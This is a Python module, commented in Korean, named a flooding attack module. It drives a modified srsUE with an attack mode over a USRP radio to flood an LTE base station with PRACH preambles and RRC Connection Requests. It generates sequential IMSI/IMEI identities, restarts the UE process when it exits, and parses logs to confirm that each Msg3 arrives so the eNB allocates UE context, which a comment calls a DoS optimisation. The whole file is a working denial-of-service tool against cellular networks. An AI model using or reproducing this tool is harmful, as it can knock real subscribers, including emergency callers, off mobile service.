#!/usr/bin/env python3
"""
Flooding Attack Module
config 파일들을 사용하여 공격을 실행하는 기능을 담당합니다.
"""

import subprocess
import time
import os
import sys
import logging
from typing import Optional, Tuple

logger = logging.getLogger(__name__)


def generate_imsi_imei(unique_id: int, mcc: Optional[int] = None, mnc: Optional[int] = None) -> Tuple[str, str]:
    """
    unique_id로부터 IMSI와 IMEI를 생성합니다.
    
    Args:
        unique_id: 고유 식별자 (1부터 시작)
        mcc: Mobile Country Code (선택)
        mnc: Mobile Network Code (선택)
    
    Returns:
        (imsi, imei) 튜플
    """
    # IMSI 생성
    if mcc is not None and mnc is not None:
        mnc_digits = 3 if mnc >= 100 else 2
        mcc_mnc_len = 3 + mnc_digits
        msin_len = 15 - mcc_mnc_len
        imsi = f"{mcc:03d}{mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
    elif mcc is not None:
        imsi = f"{mcc:03d}01{unique_id:010d}"
    elif mnc is not None:
        mnc_digits = 3 if mnc >= 100 else 2
        mcc_mnc_len = 3 + mnc_digits
        msin_len = 15 - mcc_mnc_len
        imsi = f"001{mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
    else:
        imsi = f"00101{unique_id:010d}"
    
    # IMEI 포맷팅 (15자리)
    imei_suffix = f"{unique_id:06d}"
    imei = f"35349006{imei_suffix}0"  # 총 15자리
    
    return imsi, imei


def run_srsue_with_config(srsue_path: str, config_path: str, log_file: str, usrp_args: Optional[str] = None,
                          imsi: Optional[str] = None, imei: Optional[str] = None,
                          usim_opc: Optional[str] = None, usim_k: Optional[str] = None,
                          earfcn: Optional[int] = None) -> subprocess.Popen:
    """
    템플릿 config 파일로 srsue 실행 (명령줄 인자로 IMSI/IMEI 오버라이드)
    
    Args:
        srsue_path: srsue 바이너리 경로
        config_path: 템플릿 config 파일 경로
        log_file: 로그 파일 경로
        usrp_args: USRP 장치 인자
        imsi: IMSI (명령줄 인자로 오버라이드)
        imei: IMEI (명령줄 인자로 오버라이드)
        usim_opc: USIM OPC (명령줄 인자로 오버라이드)
        usim_k: USIM K (명령줄 인자로 오버라이드)
        earfcn: EARFCN (명령줄 인자로 오버라이드)
    """
    # srsue 경로 설정 (상대 경로면 절대 경로로 변환)
    if not srsue_path:
        raise ValueError("srsue_path는 필수입니다. --srsue-path 옵션을 지정하세요.")
    
    if not os.path.isabs(srsue_path):
        srsue_path = os.path.abspath(srsue_path)
    
    # srsue 바이너리 존재 확인
    if not os.path.exists(srsue_path):
        raise FileNotFoundError(f"srsue 바이너리를 찾을 수 없습니다: {srsue_path}")
    
    # config 파일 경로를 절대 경로로 변환
    if not os.path.isabs(config_path):
        config_path = os.path.abspath(config_path)
    
    # config 파일 존재 확인
    if not os.path.exists(config_path):
        raise FileNotFoundError(f"Config 파일을 찾을 수 없습니다: {config_path}")
    
    cmd = [
        srsue_path,
        config_path,
        "--log.filename", log_file,
        "--log.all_level", "info",
        "--log.rrc_level", "debug",  # RRC 레벨을 debug로 설정하여 Msg3 로그 확인
        "--log.phy_level", "info",  # PHY 레벨을 info로 설정하여 PRACH 로그 확인
        "--log.mac_level", "info",  # MAC 레벨을 info로 설정하여 RACH 로그 확인
        "--mac.attack_mode", "true",  # attack_ue TX/RX 스레드 활성화
        "--mac.attack_prach_period_ms", "20"  # PRACH 송신 주기 (20ms)
    ]
    
    # device_args를 명령어 옵션으로 추가
    if usrp_args:
        cmd.extend(["--rf.device_args", usrp_args])
    
    # IMSI/IMEI를 명령줄 인자로 오버라이드
    if imsi:
        cmd.extend(["--usim.imsi", imsi])
    if imei:
        cmd.extend(["--usim.imei", imei])
    if usim_opc:
        cmd.extend(["--usim.opc", usim_opc])
    if usim_k:
        cmd.extend(["--usim.k", usim_k])
    if earfcn is not None:
        cmd.extend(["--rat.eutra.dl_earfcn", str(earfcn)])
    
    # 디버깅: 첫 번째 UE 실행 시 명령어 출력
    if imsi and imsi.endswith('000000001'):  # 첫 번째 UE 감지
        logger.debug(f"srsue 실행 명령어: {' '.join(cmd[:10])}... (전체 {len(cmd)}개 인자)")
    
    kwargs = {
        'stdout': subprocess.PIPE,
        'stderr': subprocess.PIPE,
    }
    if hasattr(os, 'setsid'):
        kwargs['preexec_fn'] = os.setsid
    elif sys.platform == 'darwin':
        kwargs['start_new_session'] = False
    
    return subprocess.Popen(cmd, **kwargs)


def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, running_flag=None,
                        mcc: Optional[int] = None, mnc: Optional[int] = None, 
                        earfcn: Optional[int] = None, usim_opc: Optional[str] = None,
                        usim_k: Optional[str] = None, srsue_path: Optional[str] = None):
    """
    템플릿 config 파일을 사용하여 공격을 실행합니다.
    
    Args:
        template_config: 템플릿 config 파일 경로
        usrp_args: USRP 장치 인자
        running_flag: 실행 중 플래그 (None이면 계속 실행)
        mcc: Mobile Country Code
        mnc: Mobile Network Code
        earfcn: 주파수 채널 번호
        usim_opc: USIM OPC 키
        usim_k: USIM K 키
    """
    if not os.path.exists(template_config):
        logger.error(f"템플릿 config 파일을 찾을 수 없습니다: {template_config}")
        return
    
    logger.info(f"템플릿 config: {template_config}")
    logger.info("공격 모드: msg3까지만 보내고 다음 프로세스")
    
    ue_id = 1
    current_process = None
    process_start_time = None
    current_log_file = None
    msg3_count = 0  # Msg3 전송 횟수 추적
    
    try:
        loop_count = 0
        # 프로세스를 한 번만 시작 (재사용)
        imsi, imei = generate_imsi_imei(ue_id, mcc, mnc)
        current_log_file = f"/tmp/srsue_continuous_{int(time.time() * 1000)}.log"
        
        try:
            current_process = run_srsue_with_config(
                srsue_path, template_config, current_log_file, usrp_args,
                imsi=imsi, imei=imei,
                usim_opc=usim_opc, usim_k=usim_k,
                earfcn=earfcn
            )
            process_start_time = time.time()
            
            logger.info("프로세스 시작 (재사용 모드):")
            logger.info(f"  IMSI: {imsi}, IMEI: {imei}")
            logger.info(f"  로그 파일: {current_log_file}")
            logger.info(f"  프로세스 PID: {current_process.pid}")
            logger.info(f"  USIM OPC: {'설정됨' if usim_opc else '없음'}")
            logger.info(f"  USIM K: {'설정됨' if usim_k else '없음'}")
            logger.info(f"  EARFCN: {earfcn if earfcn else '자동 스캔'}")
            logger.info("프로세스 시작 완료. attack_ue가 계속 PRACH를 전송합니다...")
        except Exception as e:
            logger.error(f"프로세스 시작 오류: {e}")
            return
        
        while running_flag is None or running_flag():
            loop_count += 1
            # 첫 번째 루프에서 상태 확인
            if loop_count == 1:
                logger.info("공격 루프 시작 (프로세스 재사용 모드)...")
            
            # 프로세스가 종료되었는지 확인
            if current_process and current_process.poll() is not None:
                logger.warning("프로세스가 종료되었습니다. 재시작합니다...")
                # 프로세스 재시작
                try:
                    imsi, imei = generate_imsi_imei(ue_id, mcc, mnc)
                    current_log_file = f"/tmp/srsue_continuous_{int(time.time() * 1000)}.log"
                    current_process = run_srsue_with_config(
                        srsue_path, template_config, current_log_file, usrp_args,
                        imsi=imsi, imei=imei,
                        usim_opc=usim_opc, usim_k=usim_k,
                        earfcn=earfcn
                    )
                    process_start_time = time.time()
                    ue_id += 1
                except Exception as e:
                    logger.error(f"프로세스 재시작 오류: {e}")
                    time.sleep(1)
                    continue
            
            # RRC Connection Request 전송 확인 (DoS 최적화: Request만 보내고 즉시 종료)
            # 타임아웃 체크는 RRC 체크 이후로 이동 (RRC를 먼저 확인)
            if current_process:
                # 프로세스가 종료되었는지 먼저 확인
                poll_result = current_process.poll()
                if poll_result is not None:
                    # 프로세스가 종료됨
                    elapsed = time.time() - process_start_time if process_start_time else 0
                    return_code = current_process.returncode
                    logger.info(f"config_{ue_id-1} 완료")
                    if return_code != 0:
                        logger.warning(f"UE 프로세스가 비정상 종료 (종료 코드: {return_code})")
                        # stderr 확인
                        try:
                            stderr_output = current_process.stderr.read().decode('utf-8', errors='ignore') if current_process.stderr else ""
                            if stderr_output:
                                logger.warning(f"프로세스 stderr: {stderr_output[:500]}")
                        except:
                            pass
                    current_process = None
                    process_start_time = None
                    current_log_file = None
                    continue
                
                # 로그 파일이 생성되었는지 확인
                if current_log_file and os.path.exists(current_log_file):
                    try:
                        # 마지막 100줄만 읽기 (효율성 개선 - seek 사용)
                        try:
                            with open(current_log_file, 'rb') as f:
                                # 파일 끝에서부터 읽기 시작
                                try:
                                    f.seek(-5000, 2)  # 끝에서 5KB 전부터 읽기
                                except OSError:
                                    f.seek(0)  # 파일이 작으면 처음부터
                                lines = f.read().decode('utf-8', errors='ignore').split('\n')
                                log_content = '\n'.join(lines[-100:])  # 마지막 100줄만
                        except Exception:
                            # fallback: 기존 방식
                            with open(current_log_file, 'r', encoding='utf-8', errors='ignore') as f:
                                lines = f.readlines()
                                log_content = ''.join(lines[-100:]) if len(lines) > 100 else ''.join(lines)
                        
                        # RRC Connection Request 전송 확인 (Msg3 - 핵심!)
                        # 실제로 eNB로 전송되었는지 확인해야 함
                        rrc_request_sent = any(keyword in log_content.lower() for keyword in [
                            'rrc connection request',
                            'sending rrc connection request',
                            'rrc connection request sent',
                            'rrcconnectionrequest',
                            'msg3',
                            'rrc connection request transmitted'
                        ])
                        
                        # RAR 수신 확인 (Msg2 - RRC Request 전 단계)
                        rar_received = any(keyword in log_content.lower() for keyword in [
                            'rar received',
                            'random access response',
                            'rar',
                            'msg2'
                        ])
                        
                        # RACH 전송 확인 (Msg1 - PRACH 전송 감지)
                        rach_sent = any(keyword in log_content.lower() for keyword in [
                            'random access',
                            'rach',
                            'preamble',
                            'sending rach',
                            'msg1'
                        ])
                        
                        # PBCH 디코딩 실패 확인
                        pbch_failed = 'could not decode pbch' in log_content.lower()
                        elapsed = time.time() - process_start_time if process_start_time else 0
                        
                        # RRC Connection Request (Msg3) 전송 확인 - 핵심!
                        # Msg3가 실제로 전송될 때까지 기다려야 eNB가 UE context를 생성함
                        if rrc_request_sent:
                            # RRC Request (Msg3) 전송 확인 → eNB가 UE context 생성
                            # 프로세스는 계속 실행 (kill하지 않음)
                            msg3_count += 1
                            logger.info(f"공격중")
                            time.sleep(0.1)  # 로그 파일 업데이트 대기
                            continue
                        # RAR 수신했을 때: Msg3 대기 (프로세스 계속 실행)
                        elif rar_received:
                            # RAR 수신 시에만 Msg3 대기 (최대 3초)
                            if elapsed < 3.0:
                                continue  # Msg3 대기
                            else:
                                # 3초 넘어도 프로세스 계속 실행 (다음 PRACH 시도)
                                logger.debug(f"RAR 수신했지만 Msg3 타임아웃 (프로세스 계속 실행)")
                                time.sleep(0.1)
                                continue
                        # RACH 전송 후 RAR 대기 중 (프로세스 계속 실행)
                        elif rach_sent:
                            # PRACH 전송 확인 - attack_ue가 계속 PRACH를 보내므로 대기
                            logger.debug(f"PRACH 전송됨 (프로세스 계속 실행)")
                            time.sleep(0.1)
                            continue
                        # PBCH 디코딩 실패 (프로세스 계속 실행)
                        elif pbch_failed:
                            # PBCH 디코딩 실패해도 프로세스 계속 실행 (셀 재검색)
                            logger.debug(f"PBCH 디코딩 실패 (프로세스 계속 실행)")
                            time.sleep(0.1)
                            continue
                    except Exception as e:
                        logger.debug(f"로그 파일 읽기 오류: {e}")
                elif current_log_file:
                    # 로그 파일이 아직 생성되지 않음
                    elapsed = time.time() - process_start_time if process_start_time else 0
                    # 프로세스 상태 확인
                    if current_process.poll() is not None:
                        logger.info(f"config_{ue_id-1} 완료")
                        current_process = None
                        process_start_time = None
                        current_log_file = None
                        continue
                    elif elapsed > 1.0 and int(elapsed) % 2 == 0:  # 2초마다 한 번씩 로그
                        logger.info(f"로그 파일 대기 중: {current_log_file} (경과: {elapsed:.1f}초, 프로세스 실행 중)")
            
            time.sleep(0.05)  # 0.1초 → 0.05초로 단축 (더 빠른 반응)
            
    except KeyboardInterrupt:
        pass
    finally:
        # 정리 (즉시 kill)
        if current_process and current_process.poll() is None:
            current_process.kill()

